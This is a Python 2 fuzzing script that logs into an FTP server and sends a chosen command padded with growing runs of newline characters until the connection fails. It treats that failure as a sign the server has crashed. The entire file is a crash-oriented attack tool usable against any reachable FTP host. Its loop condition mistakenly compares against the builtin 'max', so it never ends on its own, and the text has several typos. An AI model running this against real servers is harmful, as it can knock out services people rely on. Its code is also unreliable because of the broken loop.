#!/usr/bin/python

import sys
import socket

if len(sys.argv) != 5:
	print 'Usage: {} [Target-IP] [Port Number] [Interval] [Maximum]'.format(sys.argv[0])
	print 'Example: {} 10.0.0.5 21 100 1000'.format(sys.argv[0])
	print 'Example will fuzz the defined FYP service with a series of line breaks\ncharacters to include 100 \'\\n\'s, 200 \'\\n\'s, etc... up to the maximum of 1000'
	sys.exit()

target = str(sys.argv[1])
port = int(sys.argv[2])
i = int(sys.argv[3])
interval = int(sys.argv[3])
maximum = int(sys.argv[4])

user = raw_input(str('Enter FTP username: '))
passwd = raw_input(str('Enter FTP password: '))
command = raw_input(str('Enter FTP command to fuzz: '))

while i <= max:
	try:
		payload = command + ' ' + ('\n' * i)
		print 'Sending {} line break characters to target'.format(str(i))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((target, port))
		s.recv(1024)
		s.send('USER ' + user + '\r\n')
		s.recv(1024)
		s.send('PASS ' + passwd + '\r\n')
		s.recv(1024)
		s.send(payload + '\r\n')
		s.send('QUIT\r\n')
		s.recv(1024)
		s.close()
		i = i + interval
	except KeyboardInterrupt:
		print '\nReceived CTRL + C ketstroke.\nExiting program'
		sys.exit()
	except:
		print '\nUnable to sned...Server may have crashed'
		sys.exit()

print '\nThere is no indication that the server has crashed'
